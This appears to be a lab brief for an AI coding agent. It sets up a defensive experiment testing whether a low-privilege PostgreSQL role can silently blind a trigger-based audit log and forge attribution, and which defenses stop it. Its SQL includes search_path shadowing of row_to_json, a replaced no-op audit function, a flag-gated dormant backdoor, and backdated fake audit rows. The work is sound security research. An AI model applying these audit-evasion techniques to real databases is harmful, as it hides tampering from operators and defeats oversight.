# Self-Defeating Audits — Reproducible Lab Experiment Spec

> **Hand this file to a Claude Code session.** It is a step-by-step lab brief to
> empirically test whether a **low-privilege, injection-only** database role can
> **reversibly blind a trigger-based auditor** and **poison attribution** on
> **stock PostgreSQL**, and to evaluate defenses.
>
> The whole point of this lab is to find out **which version of the claim is
> actually true** — not to assume it. Report what actually happens, including
> failures. A negative result is a valid, publishable result.

---

## 0. Scope, ethics, and guardrails (read first — do not skip)

This is **defensive security research** conducted entirely in a **disposable,
synthetic lab**. It exists to (a) test the integrity of trigger-based DB
auditing and (b) produce concrete defenses.

**Hard rules for the whole session:**

1. **Synthetic only.** Invent all data. No real names, no real IPs, no real
   credentials, no real company/system identifiers. Use RFC 5737 doc IPs
   (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`) and obviously-fake
   user IDs.
2. **Local, throwaway container only.** Everything runs in a Docker container on
   `localhost`. Never point any step at a network host, a shared DB, or anything
   you did not just create in this lab.
3. **No live-exploit packaging.** The deliverables are: a feasibility matrix, a
   detection/forensics writeup, and defenses. Do **not** produce a
   copy-paste weaponized payload aimed at arbitrary systems; the SQL here is
   scoped to the lab schema you build.
4. **Responsible disclosure framing.** Any writeup must state it was reproduced
   on stock PostgreSQL in a lab with anonymized/synthetic data. If a real
   system inspired this, it must be remediated before publication and must
   never be identified.
5. If any step would require leaving the lab or touching real infrastructure,
   **stop and flag it** instead of proceeding.

---

## 1. Central research questions

The paper's strength rides on **RQ1**. Answer it honestly and precisely.

- **RQ1 (feasibility — the crux).** Under what *exact* configuration can a role
  holding **only** the application's privileges (simulating SQL injection into
  the app role — `INSERT/UPDATE/DELETE/SELECT` on business tables, **no**
  superuser, **no** ownership of the audit objects) cause the audit trigger to
  **stop recording** a write?
  - Specifically: is plain `search_path` shadowing of a **`pg_catalog`
    built-in** (e.g. `row_to_json`) even possible, given that `pg_catalog` is
    *implicitly searched first*? Or does it require one of the weaker
    preconditions below?
  - Map every cell of the **Feasibility Matrix** (§6). Do not generalize from one
    cell.
- **RQ2 (reversibility / anti-forensics).** After blinding, can the attacker
  restore the original state so that an object-diff scanner ("what is new or
  missing?") finds **nothing**? Measure what artifacts, if any, remain.
- **RQ3 (dormant bypass).** Can a session-variable–gated (`current_setting`)
  branch be grafted into the real trigger function so auditing is silently
  skipped only when a GUC flag is set — and is it invisible at rest?
- **RQ4 (attribution poisoning).** Can the app role write a fully fabricated
  identity (synthetic IP + non-existent user) directly into the trusted
  audit/login tables, decoupled from any real request?
- **RQ5 (defenses).** Which defenses actually stop each of RQ1–RQ4:
  engine-level `pgaudit`, function-ownership/`search_path` hardening,
  `REVOKE CREATE ON SCHEMA public`, or an out-of-engine append-only sink?

**Threat model for every experiment:** attacker == the **app role**, reached via
SQL injection. No OS access. No superuser. No ownership of audit objects unless a
cell of the matrix explicitly grants it (to model a misconfiguration).

---

## 2. Lab environment

Use Docker so it is disposable and version-pinned. **Run at least two major
PostgreSQL versions** (e.g. 14 and 16) — name resolution and defaults have
shifted over versions and the result may differ.

```bash
# scripts/00_up.sh
set -euo pipefail
PGVER="${1:-16}"                 # run again with 14
CID="sda_pg${PGVER}"
docker rm -f "$CID" 2>/dev/null || true
docker run -d --name "$CID" \
  -e POSTGRES_PASSWORD=labonly_superpw \
  -p 55432:5432 \
  postgres:${PGVER}
sleep 5
echo "Postgres ${PGVER} up as container ${CID} on localhost:55432"
```

Connection helpers (all local):

```bash
# superuser (DBA) connection — used ONLY to set up the victim + inspect
export PSQL_SU='psql "host=localhost port=55432 user=postgres password=labonly_superpw dbname=labdb"'
# attacker connection — the low-privilege app role (simulated SQLi context)
export PSQL_APP='psql "host=localhost port=55432 user=app_role password=app_pw dbname=labdb"'
```

Record for the results file: `SELECT version();` and
`SHOW search_path;` for both roles, on each PG version.

---

## 3. Build the "victim": a typical trigger-based audit system

This is the *representative* design under test — modeled on the widely-copied
PostgreSQL wiki "Audit trigger" pattern (implicit dependency on a built-in like
`row_to_json`). Build it as the **DBA/superuser**.

```sql
-- scripts/10_victim.sql   (run as postgres/superuser)
CREATE DATABASE labdb;
\c labdb

-- 3.1 roles
CREATE ROLE app_role LOGIN PASSWORD 'app_pw';   -- the low-privilege app (attacker)
-- (superuser 'postgres' is the DBA/auditor)

-- 3.2 business schema + table (synthetic)
CREATE SCHEMA app AUTHORIZATION app_role;
CREATE TABLE app.accounts (
  id           bigserial PRIMARY KEY,
  holder       text NOT NULL,
  balance_cents bigint NOT NULL DEFAULT 0
);

-- 3.3 audit schema + store, owned by DBA, NOT by app_role
CREATE SCHEMA audit;                         -- owned by postgres
CREATE TABLE audit.logged_actions (
  event_id    bigserial PRIMARY KEY,
  table_name  text        NOT NULL,
  action      text        NOT NULL,          -- I/U/D
  row_data    jsonb,                          -- captured via row_to_json
  changed_by  text        NOT NULL DEFAULT session_user,
  client_ip   inet        DEFAULT inet_client_addr(),
  logged_at   timestamptz NOT NULL DEFAULT now()
);

-- 3.4 the trigger function — note the IMPLICIT built-in dependency (row_to_json)
CREATE OR REPLACE FUNCTION audit.if_modified()
RETURNS trigger AS $$
DECLARE
  payload jsonb;
BEGIN
  -- unqualified call to a pg_catalog built-in — this is the design under test
  IF (TG_OP = 'DELETE') THEN
    payload := row_to_json(OLD)::jsonb;
  ELSE
    payload := row_to_json(NEW)::jsonb;
  END IF;
  INSERT INTO audit.logged_actions(table_name, action, row_data)
  VALUES (TG_TABLE_NAME, left(TG_OP,1), payload);
  RETURN COALESCE(NEW, OLD);
END;
$$ LANGUAGE plpgsql;                         -- NOTE: default (mutable) search_path

CREATE TRIGGER accounts_audit
  AFTER INSERT OR UPDATE OR DELETE ON app.accounts
  FOR EACH ROW EXECUTE FUNCTION audit.if_modified();

-- 3.5 app grants — the ONLY privileges the attacker holds
GRANT USAGE ON SCHEMA app TO app_role;
GRANT SELECT,INSERT,UPDATE,DELETE ON app.accounts TO app_role;
GRANT USAGE ON SEQUENCE app.accounts_id_seq TO app_role;
-- app_role deliberately has NO privileges on schema audit or its objects.
```

**Baseline sanity check (as app_role):**

```sql
-- expect: 1 audit row appears after this write
INSERT INTO app.accounts(holder,balance_cents) VALUES ('synthetic-alice', 1000);
-- (as DBA) SELECT count(*) FROM audit.logged_actions;   -- expect 1
```

If the baseline does not log, fix that before continuing.

---

## 4. Experiment 1 — Reversible auditor-blinding (RQ1, RQ2)

**Hypothesis under test:** the app role can make `audit.if_modified` fail
silently, or skip logging, on the next write — without superuser, without owning
audit objects — then restore the original so a diff scanner sees nothing.

Test **each vector below independently** and record pass/fail per matrix cell in
§6. Do **not** stop at the first success or first failure.

### Vector 1A — Plain `search_path` shadow of a `pg_catalog` built-in
*Prediction: likely FAILS on defaults, because `pg_catalog` is implicitly
searched first.* Confirm empirically.

```sql
-- as app_role. Requires a schema the app role can CREATE into that could
-- precede pg_catalog. By default pg_catalog wins — so this should NOT shadow.
CREATE SCHEMA IF NOT EXISTS evil AUTHORIZATION app_role;   -- may fail w/o CREATEDB? test
SET search_path = evil, pg_catalog, public;
CREATE OR REPLACE FUNCTION evil.row_to_json(anyelement) RETURNS json AS $$
  SELECT NULL::json;   -- returns NULL -> breaks/skips capture if ever chosen
$$ LANGUAGE sql;
-- Now trigger a write and check whether audit still captured row_data.
```
Record: does the trigger (which runs as its **own** function with its **own**
`search_path` resolution, not the caller's `SET`) ever resolve to `evil.row_to_json`?
**Key subtlety to verify:** the trigger function's search_path — not the
attacker's session `SET` — governs resolution inside the function body. State the
result plainly.

### Vector 1B — Mutable trigger `search_path` + writable preceding schema
Model the common misconfig where `public` is writable (`PUBLIC` has `CREATE`)
**and** the trigger function has no pinned `search_path`.

```sql
-- as app_role, IF app_role can CREATE in a schema that the function's
-- resolution reaches before pg_catalog for the relevant type match.
-- Test whether a best-typed-match custom function is chosen over the built-in.
CREATE OR REPLACE FUNCTION public.row_to_json(record) RETURNS json AS $$
  SELECT NULL::json;
$$ LANGUAGE sql;
```
Verify: with `record`/`anyelement` overloads, does PostgreSQL's function
resolution ever prefer the attacker's overload? Record exact behavior per version.

### Vector 1C — Direct replacement of the trigger function (ownership misconfig)
Model the misconfiguration where the audit trigger function is **owned by** (or
`ALTER`-able by) the app role — a real and common mistake when audit objects are
created by the same migration user as the app.

```sql
-- Grant scenario set up by DBA to model the misconfig:
--   ALTER FUNCTION audit.if_modified() OWNER TO app_role;   (DBA does this = the bug)
-- Then as app_role:
CREATE OR REPLACE FUNCTION audit.if_modified() RETURNS trigger AS $$
BEGIN RETURN COALESCE(NEW, OLD); END;   -- logs nothing
$$ LANGUAGE plpgsql;
-- write, observe no audit row, then RESTORE original body (reversibility test).
```
This is expected to **succeed** and is the strongest "structural dependency"
case. Measure RQ2 here: after restore, run the object-diff (§7) and confirm no
residual artifact.

### Vector 1D — `SECURITY DEFINER` + attacker-controlled `search_path`
If any helper the trigger calls is `SECURITY DEFINER` with a mutable
`search_path`, test whether the attacker can redirect it. Record applicability.

**For each vector record:** precondition required, whether it worked, what
privilege it truly needed, and whether it was reversible with zero residue.

---

## 5. Experiments 2 & 3

### Experiment 2 — GUC-gated dormant trigger bypass (RQ3)
Requires the ability to replace the trigger function body (i.e. the Vector 1C
precondition). Graft a dormant, flag-gated skip:

```sql
-- as whoever can replace audit.if_modified (per 1C misconfig)
CREATE OR REPLACE FUNCTION audit.if_modified() RETURNS trigger AS $$
DECLARE payload jsonb;
BEGIN
  IF current_setting('app.maint', true) = '1' THEN
     RETURN COALESCE(NEW, OLD);            -- dormant backdoor: silent skip
  END IF;
  IF (TG_OP='DELETE') THEN payload := row_to_json(OLD)::jsonb;
  ELSE payload := row_to_json(NEW)::jsonb; END IF;
  INSERT INTO audit.logged_actions(table_name,action,row_data)
  VALUES (TG_TABLE_NAME,left(TG_OP,1),payload);
  RETURN COALESCE(NEW,OLD);
END; $$ LANGUAGE plpgsql;
```
Test: writes are logged normally; then `SET app.maint='1'` in a session and
confirm writes in that session are **not** logged, while other sessions are.
Measure detectability at rest (the function *looks* legitimate — that's the
point). Note: this is a **known-style** pattern; treat as supporting evidence,
not a headline novelty claim.

### Experiment 3 — Attribution poisoning from within (RQ4)
Model the misconfig where the app role can `INSERT` into audit/login tables
(happens when a single role owns everything, or grants are too broad). If the app
role has no such grant by default, record that as a **defense that already holds**
and then test the misconfigured variant.

```sql
-- misconfig grant by DBA to model the bug: GRANT INSERT ON audit.logged_actions TO app_role;
-- then as app_role, fabricate a fully synthetic false identity, decoupled from any real request:
INSERT INTO audit.logged_actions(table_name,action,row_data,changed_by,client_ip,logged_at)
VALUES ('accounts','U','{"note":"synthetic-decoy"}'::jsonb,
        'ghost_user_42',            -- non-existent user
        '203.0.113.77'::inet,       -- RFC5737 documentation IP (fake)
        now() - interval '3 days'); -- backdated decoy
```
Record: can a forensic reviewer distinguish this fabricated row from a genuine
one using **only** the DB audit table? (Expected: no — motivating cross-layer
correlation and out-of-engine logging.)

---

## 6. Feasibility Matrix (the core deliverable — fill this in)

Run every cell on **each PG version**. This table *is* the RQ1 answer.

| Vector | Precondition modeled | PUBLIC has CREATE on `public`? | Trigger fn `search_path` pinned? | app_role owns audit fn? | Result (logged? / skipped? / errored?) | Reversible w/ zero residue? | True privilege needed |
|--------|----------------------|:------------------------------:|:--------------------------------:|:-----------------------:|:---------------------------------------:|:---------------------------:|-----------------------|
| 1A plain catalog shadow | default | yes | no | no | | | |
| 1A plain catalog shadow | hardened | no | yes | no | | | |
| 1B mutable path + writable public | misconfig | yes | no | no | | | |
| 1C replace trigger fn | ownership misconfig | — | — | yes | | | |
| 1D secdef helper | misconfig | — | no | no | | | |
| 2 GUC dormant | needs 1C | — | — | yes | | | |
| 3 attribution poison | broad grant | — | — | (insert grant) | | | |

**Interpretation guide for the writeup:**
- If blinding needs **1C** (app owns the audit function) → the honest claim is
  *"a common ownership/grant misconfiguration lets the auditee reversibly blind
  the auditor without superuser."* Strong but scoped. (★★★★)
- If blinding works via **1A/1B on default config** (PUBLIC CREATE on `public`,
  unpinned trigger `search_path`) → escalate the claim to *structural on stock
  defaults.* (★★★★★, verify very carefully — this is the surprising outcome.)
- If **only** hardened-config cells fail and everything else needs a misconfig →
  the contribution is *"a hardening checklist + a demonstration that the default
  trust assumption is fragile,"* still worthwhile, framed honestly.

---

## 7. Detection & forensics (per experiment)

For each successful attack, determine what a defender could catch:

- **Object diff:** snapshot `pg_proc`, `pg_trigger`, function source
  (`pg_get_functiondef`), owners, and `proconfig` before/after. Script it:
  ```sql
  SELECT p.oid, n.nspname, p.proname, pg_get_functiondef(p.oid) AS src,
         p.proowner::regrole, p.proconfig
  FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace
  WHERE n.nspname IN ('audit','public','evil');
  ```
  Diff snapshots to test RQ2 (does restore leave residue?).
- **Audit-gap detection:** a canary — a second, independent counter of writes
  (e.g. row count deltas on `app.accounts` vs. count of audit rows). A gap = a
  blind spot even if no object looks wrong.
- **Catalog-change monitoring:** does `CREATE OR REPLACE FUNCTION` on an audit
  object emit anything catchable (event triggers, `log_statement=ddl`)? Test an
  **event trigger** (`ddl_command_end`) as a detection control and see if the
  attacker can also disable it.
- **Attribution cross-check:** compare DB audit rows against a separate app-side
  log to expose the fabricated row in Experiment 3.

---

## 8. Defenses to evaluate (RQ5)

Re-run the successful attacks against each hardened configuration and record
which attacks die:

1. **`REVOKE CREATE ON SCHEMA public FROM PUBLIC`** (default-changed in PG15+ —
   verify difference between 14 and 16). Kills 1A/1B writable-schema vectors.
2. **Pin `search_path` on the trigger function:**
   `ALTER FUNCTION audit.if_modified() SET search_path = pg_catalog, audit;`
   Kills shadowing-via-path.
3. **Correct ownership:** audit objects owned by a dedicated `audit_owner` role
   the app can never `ALTER`; `REVOKE ALL ON FUNCTION audit.if_modified() FROM app_role`.
   Kills 1C and thus Experiment 2.
4. **Engine-level `pgaudit`** instead of trigger auditing — logs at the executor,
   outside the app role's reach. Test whether **any** of 1A–1D or Exp 2 can
   suppress a `pgaudit` line. (Expected: no — this is the recommended fix.)
5. **Out-of-engine, append-only sink:** ship audit to a WORM/append-only store
   (e.g. logical decoding → external collector). Test whether Experiment 3's
   fabricated row can survive there, or is exposed by hash-chaining
   (cf. tamper-evident logging).
6. **`event trigger` DDL guard** on audit-schema objects; test attacker's ability
   to remove it.

Produce a **defense × attack** matrix: rows = attacks (1A–3), columns = defenses
(1–6), cells = stopped / not-stopped.

---

## 9. Deliverables the Claude Code session should produce

1. `scripts/` — `00_up.sh`, `10_victim.sql`, `20_attacks.sql`, `30_defenses.sql`,
   `40_snapshot.sql` (all lab-scoped, synthetic).
2. `RESULTS.md` — the filled Feasibility Matrix (§6), the detection findings
   (§7), and the defense×attack matrix (§8), **for PG 14 and 16**.
3. `FINDINGS.md` — a plain-English verdict answering RQ1–RQ5, explicitly stating
   which claim strength the evidence supports (scoped-misconfig vs.
   stock-default), and listing the exact preconditions.
4. `teardown.sh` — `docker rm -f` the containers. Leave nothing running.

**Reporting discipline:** report negative results faithfully. If plain catalog
shadowing (1A) fails on defaults — which is the likely outcome — say so; that
sharpens the paper (it becomes "the risk is ownership/grant misconfig +
unpinned search_path," which is precise and defensible). Do not overstate.

---

## 10. Reproducibility checklist (for the eventual paper)

- [ ] Exact `postgres:14` and `postgres:16` image digests recorded.
- [ ] `SELECT version()`, `SHOW search_path`, role privileges captured for each.
- [ ] Every attack scoped to the lab schema; no external hosts touched.
- [ ] All identities/IPs synthetic (RFC 5737); no real data anywhere.
- [ ] Feasibility Matrix complete for both versions.
- [ ] Defense×attack matrix complete.
- [ ] Teardown verified (no containers left).
- [ ] Writeup states responsible-disclosure posture and lab-only reproduction.

---

*End of spec. Build the victim first, verify the baseline logs, then work the
matrix cell by cell. The feasibility matrix is the result — everything else is
supporting evidence and defenses.*
